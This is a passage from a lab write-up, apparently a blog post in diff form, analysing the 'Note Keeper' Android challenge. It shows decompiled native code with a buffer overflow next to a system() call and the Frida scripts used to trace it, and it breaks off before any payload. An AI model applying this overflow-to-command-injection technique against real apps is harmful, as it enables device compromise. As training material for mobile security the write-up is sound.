+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-31">31</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-32">32</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-33"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-33">33</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-34"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-34">34</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-35"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-35">35</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-36"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-36">36</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>undefined8
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Java_com_mobilehackinglab_notekeeper_MainActivity_parse</span>
+</span></span><span style="display:flex;"><span>          (_JNIEnv <span style="color:#f92672">*</span>param_1,undefined8 param_2,_jstring <span style="color:#f92672">*</span>param_3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_2a8;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_2a4 [<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> acStack_240 [<span style="color:#ae81ff">500</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_4c;
+</span></span><span style="display:flex;"><span>  ushort <span style="color:#f92672">*</span>local_48;
+</span></span><span style="display:flex;"><span>  _jstring <span style="color:#f92672">*</span>local_40;
+</span></span><span style="display:flex;"><span>  undefined8 local_38;
+</span></span><span style="display:flex;"><span>  _JNIEnv <span style="color:#f92672">*</span>local_30;
+</span></span><span style="display:flex;"><span>  undefined8 local_28;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_40 <span style="color:#f92672">=</span> param_3;
+</span></span><span style="display:flex;"><span>  local_38 <span style="color:#f92672">=</span> param_2;
+</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> param_1;
+</span></span><span style="display:flex;"><span>  local_48 <span style="color:#f92672">=</span> (ushort <span style="color:#f92672">*</span>)_JNIEnv<span style="color:#f92672">::</span>GetStringChars(param_1,param_3,(uchar <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>  local_4c <span style="color:#f92672">=</span> _JNIEnv<span style="color:#f92672">::</span>GetStringLength(local_30,local_40);
+</span></span><span style="display:flex;"><span>  memcpy(acStack_240,<span style="color:#e6db74">&#34;Log </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Note added at $(date)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_48 <span style="color:#f92672">==</span> (ushort <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    local_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    local_2a4[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> FUN_00100bf4(<span style="color:#f92672">*</span>local_48 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (local_2a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; local_2a8 <span style="color:#f92672">&lt;</span> local_4c; local_2a8 <span style="color:#f92672">=</span> local_2a8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      local_2a4[local_2a8] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)local_48[local_2a8];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    system(acStack_240);
+</span></span><span style="display:flex;"><span>    local_2a4[local_2a8] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>    local_28 <span style="color:#f92672">=</span> _JNIEnv<span style="color:#f92672">::</span>NewStringUTF(local_30,local_2a4);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_28;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Based on the C++ code, I noticed that there&rsquo;s a function <code>system</code> that it used to execute command. Aside from that, it has a for loop that will write every char input into a variable <code>local_2a4</code> but the variable can only support up to 100 characters <code>char local_2a4 [100];</code>. Since this challenge has something to do with buffer overflow, I suspect this is the place that I should inject my code where I perform buffer overflow and write into the <code>acStack_240</code>. Now from what I understand, time to try it with dynamic analysis.</p>
+<h3 id="dynamic-analysis">Dynamic Analysis<a hidden class="anchor" aria-hidden="true" href="#dynamic-analysis">#</a></h3>
+<p>I started out by playing around with the application.</p>
+<p><img alt="alt text" loading="lazy" src="/posts/mhl-note-keeper/img/index.png#center"></p>
+<p>I noticed that after I tried to execute the native function <code>parse</code>, I dont get any useful information from it. I then tried to hook using Frida. To do so, start a frida server first.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-1">1</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>beryllium:/ <span style="color:#75715e"># /data/local/tmp/frida-server</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After setting a frida-server in the rooted devices, I then proceed to write some simple script to check what its doing.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-12">12</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">ava</span>.<span style="color:#a6e22e">perform</span>(()=&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MainActivity</span>[<span style="color:#e6db74">&#34;parse&#34;</span>].<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">Title</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse is called: Title=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">Title</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#34;parse&#34;</span>](<span style="color:#a6e22e">Title</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse result=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-14">14</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS E:\Desktop\Android\frida-script&gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js
+</span></span><span style="display:flex;"><span>     ____
+</span></span><span style="display:flex;"><span>    / _  |   Frida <span style="color:#ae81ff">16.5</span>.9 - A world-class dynamic instrumentation toolkit
+</span></span><span style="display:flex;"><span>   | (_| |
+</span></span><span style="display:flex;"><span>    &gt; _  |   Commands<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>   /_/ |_|       help      -&gt; Displays the help system
+</span></span><span style="display:flex;"><span>   . . . .       object?   -&gt; Display information about <span style="color:#e6db74">&#39;object&#39;</span>
+</span></span><span style="display:flex;"><span>   . . . .       exit/quit -&gt; Exit
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   More info at https<span style="color:#960050;background-color:#1e0010">:</span>//frida.re/docs/home/
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
+</span></span><span style="display:flex;"><span>[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-&gt; MainActivity.parse is called<span style="color:#960050;background-color:#1e0010">:</span> Title=q
+</span></span><span style="display:flex;"><span>MainActivity.parse result=Q
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I tried feeding in random data again and use frida to check the input and output, which basically taking <code>q</code> as input and <code>Q</code> as output. Things isnt right here as I need to get the <code>system</code> function to see what it&rsquo;s doing. I then tried to write another frida script to try and hook the <code>system</code> function.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-11">11</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">Interceptor</span>.<span style="color:#a6e22e">attach</span>(<span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">getExportByName</span>(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;system&#34;</span>), {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">onEnter</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">args</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">readUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() called with command: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">command</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hexdump</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>],{<span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">onLeave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">retval</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() returned with code: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">retval</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After adding this, I managed to read some information from the <code>system</code> function.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-5"> 5</a>
